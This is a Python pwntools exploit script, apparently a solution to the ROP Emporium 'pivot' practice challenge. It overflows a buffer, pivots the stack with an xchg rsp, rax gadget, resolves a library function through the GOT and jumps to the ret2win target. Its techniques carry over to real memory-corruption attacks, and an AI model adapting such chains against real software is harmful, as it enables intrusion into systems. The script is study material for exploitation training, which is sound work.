import struct
import sys

import pwn

### Whether to run statically and dumo the exploit or
### dynamically with pwntools.
static = False
if len(sys.argv) > 1:
    if sys.argv[1] == '-s':
        static = True

pwnme_addr     = 0x4008f1

buf_addr       = 0x7fffffffe0d0
saved_rip_addr = 0x7fffffffe0f8

ret2win_addr    = 0xa81
foothold_addr   = 0x96a

plt_foothold_addr = 0x400720
got_foothold_addr = 0x601040

pop_rax_addr          = 0x4009bb
xchg_rsp_rax_addr     = 0x4009bd

mov_rax_from_mem_addr = 0x4009c0
pop_rbp_addr          = 0x400829
add_rax_rbp_addr      = 0x4009c4
jmp_rax_addr          = 0x400803

class Exploit():
    def __init__(self):
        self.payload = b""

        self.hints = []

    def pad(self, num_bytes, b = b"a"):
        self.payload += b * num_bytes
        self.hints.extend(["padding"] * (num_bytes//8))

        if num_bytes % 8 != 0:
            print("Warning: padding is not 8-byte aligned.")
            print("This will mess up the hints.")

    def append_word(self, word, hint = ""):
        self.payload += struct.pack("<Q", word)
        
        self.hints.append(hint)

    def append_pop_rdi_chain(self, rdi):
        self.append_word(pop_rdi_addr, hint = "pop rdi")
        self.append_word(rdi, hint = "new rdi value")

    def append_pop_rax_chain(self, rax):
        self.append_word(pop_rax_addr, hint = "pop rax")
        self.append_word(rax, hint = "new rax value")

    def append_pop_rbp_chain(self, rbp):
        self.append_word(pop_rbp_addr, hint = "pop rbp")
        self.append_word(rbp, hint = "new rbp value")
        
    def write(self, filename):
        with open(filename, "wb") as f:
            f.write(self.payload)
        print("Wrote {} (0x{:x}) bytes to {}".format(len(self.payload),
                                                   len(self.payload),
                                                   filename))

    def show_with_hints(self):
        for i in range(len(self.payload) // 8):
            chunk = self.payload[8*i: 8*i + 8]

            print("0x{:016x}".format(int.from_bytes(chunk, "little")),
                  "   ->", self.hints[i])

### Exploit we'll execute after pivoting to the new stack.
real_exploit = Exploit()

### First we need to call foothold function so that its
### actual address is loaded into the GOT.
real_exploit.append_word(plt_foothold_addr, hint = "load foothold in GOT")

real_exploit.append_pop_rax_chain(got_foothold_addr)
real_exploit.append_word(mov_rax_from_mem_addr, hint = "mov rax, [rax]")
real_exploit.append_pop_rbp_chain(ret2win_addr - foothold_addr)
real_exploit.append_word(add_rax_rbp_addr, hint = "add rax, rbp")
real_exploit.append_word(jmp_rax_addr, hint = "jmp rax")

real_exploit.pad(0x100 - len(real_exploit.payload), b = b"x")

#print("Exploit on the pivoted stack:")
#real_exploit.show_with_hints()

if static:
    pivot_dest = 0x7ffff7bf8f10
    
else:
    ### Start the process with pwntools.
    p = pwn.process("./pivot")

    ### Extract the pivot destination from the output.
    preface = p.recvuntil(b"> ")
    print(preface)
    temp = preface[preface.index(b"0x") + 2: ]
    pivot_dest_str = temp[: temp.index(b"\n")]
    pivot_dest = int(pivot_dest_str, base = 16)
    print(hex(pivot_dest))

### Exploit that will actually perform the pivot.
pivot_exploit = Exploit()

pivot_exploit.pad(saved_rip_addr - buf_addr)
pivot_exploit.append_pop_rax_chain(pivot_dest)
pivot_exploit.append_word(xchg_rsp_rax_addr, hint = "xchg rsp, rax")

if static:
    with open("payload", "wb") as f:
        f.write(real_exploit.payload)
        f.write(pivot_exploit.payload)

else:
    p.send(real_exploit.payload + pivot_exploit.payload)

    print(p.recvall())
